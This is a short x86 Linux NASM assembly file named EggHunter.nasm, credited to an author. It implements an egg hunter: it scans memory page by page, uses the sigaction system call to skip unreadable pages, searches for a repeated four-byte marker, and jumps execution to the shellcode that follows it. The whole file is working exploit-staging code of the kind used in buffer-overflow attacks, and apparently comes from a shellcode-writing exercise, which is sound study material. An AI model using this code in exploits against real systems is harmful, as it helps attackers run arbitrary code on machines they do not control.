; EggHunter.nasm
; Author: Ravehorn

global _start

section .text

_start:

    cld
    xor ecx, ecx
    mul ecx

AlignFunc:

    or cx, 0xfff

Search:
    
    inc ecx
    push byte 0x43
    pop eax
    int 0x80
    cmp al, 0xf2
    jz AlignFunc
    mov eax, 0x4747456d ; Our Egg
    mov edi, ecx
    scasd
    jnz Search
    scasd
    jnz Search
    jmp edi